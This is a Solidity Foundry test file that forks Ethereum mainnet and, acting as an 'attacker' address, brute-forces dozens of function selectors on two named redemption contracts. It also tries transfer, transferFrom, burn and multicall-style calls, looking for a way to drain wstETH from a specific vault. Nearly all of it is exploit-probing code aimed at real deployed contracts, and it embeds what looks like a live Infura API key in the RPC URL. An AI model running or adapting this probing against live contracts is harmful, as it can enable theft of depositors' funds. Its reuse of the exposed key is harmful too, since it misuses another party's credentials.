// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract DeepSelectorAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ExhaustiveR0SelectorTest() public {
        console.log("=== EXHAUSTIVE REDEMPTION_0 SELECTOR TEST ===\n");

        // All REDEMPTION_0 selectors found
        bytes4[38] memory sels = [
            bytes4(0x715018a6), bytes4(0xaff6cbf1), bytes4(0xe30c3978), bytes4(0xed45b661),
            bytes4(0xeda72134), bytes4(0xf2fde38b), bytes4(0xb2118a8d), bytes4(0xcff50c6e),
            bytes4(0x8da5cb5b), bytes4(0x900fd1ed), bytes4(0x9307e802), bytes4(0xa82b69ff),
            bytes4(0x7630c4a8), bytes4(0x79ba5097), bytes4(0x3a2ef9df), bytes4(0x458f5815),
            bytes4(0x51cbf345), bytes4(0x5c975abb), bytes4(0x5f8b5592), bytes4(0x3f14c193),
            bytes4(0x411557d1), bytes4(0x196e6b1d), bytes4(0x2ab60045), bytes4(0x38a63183),
            bytes4(0x04824e70), bytes4(0x1650cf97), bytes4(0x192a8e86), bytes4(0x4cdad506),
            bytes4(0xba087652), bytes4(0x9816f473), bytes4(0x70a08231), bytes4(0x42966c68),
            bytes4(0x7bde82f2), bytes4(0x1f240274), bytes4(0x23b872dd), bytes4(0x035faf82),
            bytes4(0xa9059cbb), bytes4(0x43000818)
        ];

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        console.log("Testing each selector with (address, uint256):");

        for (uint i = 0; i < sels.length; i++) {
            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);

            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultNow) {
                console.log("*** DRAINED with:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault drained:", (vaultBefore - vaultFinal) / 1e18);
    }

    function test_ExhaustiveR1SelectorTest() public {
        console.log("=== EXHAUSTIVE REDEMPTION_1 SELECTOR TEST ===\n");

        // All REDEMPTION_1 selectors
        bytes4[40] memory sels = [
            bytes4(0x715018a6), bytes4(0xc5d664c6), bytes4(0xeda72134), bytes4(0x578063ed),
            bytes4(0xf2fde38b), bytes4(0xfd424ea8), bytes4(0xcff50c6e), bytes4(0xe30c3978),
            bytes4(0x8da5cb5b), bytes4(0x9307e802), bytes4(0xb2118a8d), bytes4(0x778d364f),
            bytes4(0x79ba5097), bytes4(0x411557d1), bytes4(0x51cbf345), bytes4(0x5c975abb),
            bytes4(0x61d027b3), bytes4(0x42dbe168), bytes4(0x458f5815), bytes4(0x252c50f3),
            bytes4(0x2ab60045), bytes4(0x38a63183), bytes4(0x04824e70), bytes4(0x06e29712),
            bytes4(0x1650cf97), bytes4(0x36600461), bytes4(0xa29faff0), bytes4(0x70a08231),
            bytes4(0x07a2d13a), bytes4(0x3f14c193), bytes4(0x57604051), bytes4(0xddca3f43),
            bytes4(0x4cdad506), bytes4(0xba087652), bytes4(0x781b7e08), bytes4(0x42966c68),
            bytes4(0x7bde82f2), bytes4(0x23b872dd), bytes4(0xa9059cbb), bytes4(0x43000818)
        ];

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        console.log("Testing each selector with (address, uint256):");

        for (uint i = 0; i < sels.length; i++) {
            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);

            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            if (vaultAfter < vaultNow) {
                console.log("*** DRAINED with:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault drained:", (vaultBefore - vaultFinal) / 1e18);
    }

    function test_CheckTransferFunctions() public {
        console.log("=== CHECKING TRANSFER FUNCTIONS ===\n");

        // Both contracts have transfer/transferFrom selectors
        // These might transfer wstETH!

        deal(wstETH, REDEMPTION_0, 100e18);
        deal(wstETH, REDEMPTION_1, 100e18);

        vm.startPrank(attacker);

        // Try transfer on REDEMPTION_0
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 50e18)
        );
        console.log("R0.transfer(attacker, 50):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // Try transferFrom on REDEMPTION_0
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VAULT, attacker, 50e18)
        );
        console.log("R0.transferFrom(VAULT, attacker, 50):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        // Try on REDEMPTION_1
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 50e18)
        );
        console.log("R1.transfer(attacker, 50):", s3);
        if (!s3 && d3.length >= 4) console.logBytes4(bytes4(d3));

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_CheckBurnFunction() public {
        console.log("=== CHECKING BURN FUNCTION ===\n");

        // 0x42966c68 = burn(uint256)
        // If this burns and sends underlying...

        deal(IAU, attacker, 10000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try burn on both
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x42966c68), 100e18)
        );
        console.log("R0.burn(100e18):", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x42966c68), 100e18)
        );
        console.log("R1.burn(100e18):", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWst / 1e18);
    }

    function test_CheckUniqueR1Selectors() public {
        console.log("=== CHECKING UNIQUE R1 SELECTORS ===\n");

        // Selectors only in R1, not in R0
        // 0xc5d664c6, 0x578063ed, 0xfd424ea8, 0x778d364f, 0x61d027b3
        // 0x42dbe168, 0x06e29712, 0x36600461, 0xa29faff0, 0x07a2d13a
        // 0x57604051, 0xddca3f43, 0x781b7e08

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        console.log("Testing unique R1 selectors:");

        // 0xc5d664c6
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), attacker, 100e18)
        );
        console.log("0xc5d664c6(attacker, 100):", s1);
        if (s1 && d1.length >= 32) console.log("  Return:", uint256(bytes32(d1)));

        // 0x578063ed
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x578063ed))
        );
        console.log("0x578063ed():", s2);
        if (s2 && d2.length >= 32) console.log("  Return:", uint256(bytes32(d2)));

        // 0xfd424ea8
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), attacker)
        );
        console.log("0xfd424ea8(attacker):", s3);
        if (s3 && d3.length >= 32) console.log("  Return:", uint256(bytes32(d3)));

        // 0x61d027b3 - treasury()?
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x61d027b3))
        );
        console.log("0x61d027b3():", s4);
        if (s4 && d4.length >= 32) {
            address addr = address(uint160(uint256(bytes32(d4))));
            console.log("  Returns address:", addr);
        }

        // 0xa29faff0
        (bool s5, bytes memory d5) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xa29faff0), 100e18)
        );
        console.log("0xa29faff0(100e18):", s5);

        // 0x57604051 - might be multicall?
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);
        (bool s6, bytes memory d6) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x57604051), calls)
        );
        console.log("0x57604051(calls):", s6);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_Check0x36600461() public {
        console.log("=== CHECKING 0x36600461 ===\n");

        // This selector is unique to R1
        // Let's try various parameter patterns

        vm.startPrank(attacker);

        // No params
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461))
        );
        console.log("0x36600461():", s1);
        if (s1 && d1.length > 0) console.log("  Return length:", d1.length);

        // Single address
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461), attacker)
        );
        console.log("0x36600461(attacker):", s2);

        // (address, uint256)
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461), attacker, 100e18)
        );
        console.log("0x36600461(attacker, 100e18):", s3);

        // (uint256, address)
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461), 100e18, attacker)
        );
        console.log("0x36600461(100e18, attacker):", s4);

        // (address, bytes)
        bytes memory data = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);
        (bool s5, bytes memory d5) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x36600461), REDEMPTION_CONTROLLER, data)
        );
        console.log("0x36600461(RC, redeemData):", s5);

        vm.stopPrank();
    }
}
